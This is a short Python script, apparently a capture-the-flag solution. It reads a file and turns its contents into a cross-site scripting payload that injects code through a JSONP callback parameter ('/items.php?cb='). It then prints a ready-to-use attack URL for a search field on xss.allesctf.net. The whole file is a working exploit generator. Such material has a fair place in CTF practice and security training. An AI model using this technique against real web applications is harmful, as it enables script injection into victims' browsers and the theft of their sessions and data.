#!/usr/bin/python3

from pathlib import Path
import sys
from urllib import parse

if len(sys.argv) == 2:

    p = Path(sys.argv[1])

    base = r"http://xss.allesctf.net/?search="

    if p.is_file():

        with p.open():
            content = p.read_text()
            injection = content.replace("\n", "").replace("\t", "")

        xss = r"<script src='/items.php?cb={}//'></script>".format(injection)
        print(xss, end="\n\n")
        print(base + xss)

